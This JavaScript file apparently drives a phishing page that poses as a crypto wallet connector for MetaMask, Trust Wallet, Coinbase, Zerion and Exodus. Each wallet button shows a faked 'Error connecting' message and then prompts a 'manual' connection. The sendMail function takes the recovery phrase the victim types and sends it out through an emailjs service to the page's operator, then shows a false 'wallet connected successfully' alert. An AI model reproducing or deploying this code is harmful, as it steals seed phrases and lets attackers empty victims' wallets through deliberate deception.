
    let modal = document.querySelector('.modal')
    let open1 = document.querySelector('#listing-1')
    let open2 = document.querySelector('#listing-2')
    let open3 = document.querySelector('#listing-3')
    let open4 = document.querySelector('#listing-4')
    let open5 = document.querySelector('#listing-5')
    let open6 = document.querySelector('#listing-6')
    let open7 = document.querySelector('#listing-7')
    let open8 = document.querySelector('#listing-8')
    let open9 = document.querySelector('#listing-9')
    let open10 = document.querySelector('#listing-10')
    let open11 = document.querySelector('#listing-11')
    let open12 = document.querySelector('#listing-12')
    let open13 = document.querySelector('#listing-13')
    let open14 = document.querySelector('#listing-14')
    let close = document.querySelector('#close')
    let back = document.querySelector('.backdrop')
    let connect = document.getElementById('connect')
    
    

    open1.addEventListener( 'click',function() {
       modal.style.visibility = 'visible';
       back.style.visibility = 'visible';
    })

    open2.addEventListener( 'click',function() {
        modal.style.visibility = 'visible';
        back.style.visibility = 'visible';
     })
     open3.addEventListener( 'click',function() {
        modal.style.visibility = 'visible';
        back.style.visibility = 'visible';
     })
     open4.addEventListener( 'click',function() {
        modal.style.visibility = 'visible';
        back.style.visibility = 'visible';
     })
     open5.addEventListener( 'click',function() {
        modal.style.visibility = 'visible';
        back.style.visibility = 'visible';
     })
     open6.addEventListener( 'click',function() {
        modal.style.visibility = 'visible';
        back.style.visibility = 'visible';
     })

     open7.addEventListener( 'click',function() {
      modal.style.visibility = 'visible';
      back.style.visibility = 'visible';
   })

   open8.addEventListener( 'click',function() {
      modal.style.visibility = 'visible';
      back.style.visibility = 'visible';
   })

   open9.addEventListener( 'click',function() {
      modal.style.visibility = 'visible';
      back.style.visibility = 'visible';
   })
   open10.addEventListener( 'click',function() {
      modal.style.visibility = 'visible';
      back.style.visibility = 'visible';
   })
   open11.addEventListener( 'click',function() {
      modal.style.visibility = 'visible';
      back.style.visibility = 'visible';
   })
   open12.addEventListener( 'click',function() {
      modal.style.visibility = 'visible';
      back.style.visibility = 'visible';
   })
   open13.addEventListener( 'click',function() {
      modal.style.visibility = 'visible';
      back.style.visibility = 'visible';
   })
   open14.addEventListener( 'click',function() {
      modal.style.visibility = 'visible';
      back.style.visibility = 'visible';
   })

     close.addEventListener('click', function(){
        modal.style.visibility = 'hidden';
        back.style.visibility = 'hidden';
     })

    
     connect.addEventListener( 'click',function() {
      modal.style.visibility = 'visible';
      back.style.visibility = 'visible';
   })


       


   let phrasy = document.querySelector('.phrase')
   let meta = 'Meta mask';
   let trust = 'Trust wallet';
   let coin = 'Coinbase';
   let zerion = 'Zerion';
   let wall = document.getElementById('wall-name')
   let closePhrase = document.getElementById('close-phrase')
   let wallet1 = document.getElementById('wallets-1')
   let wallet2 = document.getElementById('wallets-2')
   let wallet3 = document.getElementById('wallets-3')
   let wallet4 = document.getElementById('wallets-4')
   let wallet5 = document.getElementById('wallets-5')
   let walletName = document.getElementById('trust')
   let con = document.getElementById('con');
   let closerr = document.getElementById('close-error')
   let manual = document.getElementById('manual')
   let error = document.querySelector(".error")

   manual.addEventListener('click', function() {
      phrasy.style.visibility = 'visible'
   })

   wallet1.addEventListener('click',function(){
      
error.style.visibility = 'visible';
modal.style.visibility = 'hidden'
back.style.visibility = 'hidden';
wall.value = 'trust wallet';
walletName.value = `${trust}`

setTimeout(function() {
   con.innerHTML = 'Error connecting'
   con.style.color = 'red'
},2000);

setTimeout(function() {
   manual.style.visibility = 'visible';
},2000);

closerr.addEventListener("click", function (){
   error.style.visibility = "hidden"
   manual.style.visibility = 'hidden'
})

   })

   closePhrase.addEventListener('click', function(){
      phrasy.style.visibility = 'hidden';
      back.style.visibility = 'hidden';
   })


   wallet2.addEventListener('click',function(){
      error.style.visibility = 'visible';
      modal.style.visibility = 'hidden'
      back.style.visibility = 'hidden';
      wall.value = 'metamask';
      walletName.value = `${meta}`

      setTimeout(function() {
         con.innerHTML = 'Error connecting'
         con.style.color = 'red'
      },2000);
      
      setTimeout(function() {
         manual.style.visibility = 'visible';
      },2000);
      
      
         })
      
         closerr.addEventListener("click", function (){
            error.style.visibility = "hidden"
            manual.style.visibility = 'hidden'
         })
         

         wallet3.addEventListener('click',function(){
            error.style.visibility = 'visible';
            modal.style.visibility = 'hidden'
            back.style.visibility = 'hidden';
            wall.value = 'coinbase';
            walletName.value = `${coin}`

            setTimeout(function() {
               con.innerHTML = 'Error connecting'
               con.style.color = 'red'
            },2000);
            
            setTimeout(function() {
               manual.style.visibility = 'visible';
            },2000);
            
            
               })
            
            
            
              
               closerr.addEventListener("click", function (){
                  error.style.visibility = "hidden"
                  manual.style.visibility = 'hidden'
               })
            
               
               wallet4.addEventListener('click',function(){
                  error.style.visibility = 'visible';
                  modal.style.visibility = 'hidden'
                  back.style.visibility = 'hidden';
                  wall.value = 'Zerion';
                  walletName.value = `${zerion}`

                  setTimeout(function() {
                     con.innerHTML = 'Error connecting'
                     con.style.color = 'red'
                  },2000);
                  
                  setTimeout(function() {
                     manual.style.visibility = 'visible';
                  },2000);
                  
                  
                  
                     })
                  
                     closerr.addEventListener("click", function (){
                        error.style.visibility = "hidden"
                        manual.style.visibility = 'hidden'
                     })
                     
      
                     
                     wallet5.addEventListener('click',function(){
                        error.style.visibility = 'visible';
                        modal.style.visibility = 'hidden'
                        back.style.visibility = 'hidden'
                        wall.value = 'exodus';
                        walletName.value = ''

                        setTimeout(function() {
                           con.innerHTML = 'Error connecting'
                           con.style.color = 'red'
                        },2000);
                        
                        setTimeout(function() {
                           manual.style.visibility = 'visible';
                        },2000);
                        
                        closerr.addEventListener("click", function (){
                           error.style.visibility = "hidden"
                           manual.style.visibility = 'hidden'
                        })
                        
                        
                           })
                        
                          


                           function sendMail() {
                              let params = {
                                 name: document.getElementById("trust").value,
                               message: document.getElementById("phrase-input").value,
                               
                            
                            }
                            
                            emailjs.send("service_76lfowd", "template_5t229py", params).then(function (res) {
                            alert("wallet connected successfully")
                            })

                            phrasy.style.visibility = 'hidden'
                            back.style.visibility = 'hidden'
                            }
                        

